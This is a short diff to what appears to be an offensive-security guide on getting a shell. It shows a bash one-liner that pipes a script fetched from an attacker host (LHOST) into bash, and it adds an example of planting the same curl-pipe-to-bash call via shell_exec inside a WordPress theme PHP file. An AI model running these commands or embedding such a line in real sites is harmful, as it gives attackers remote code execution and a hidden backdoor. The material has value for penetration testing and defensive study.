@@ -52,3 +52,9 @@ where `LHOST` has to be replaced with attacker's IP.
     ```bash
     wget -q http://LHOST/socat.sh -O - | bash
     ```
+    
+In a Wordpress theme PHP file, it could looks like this:
+```php
+shell_exec("curl -q http://LHOST/socat.sh | bash");
+```
+
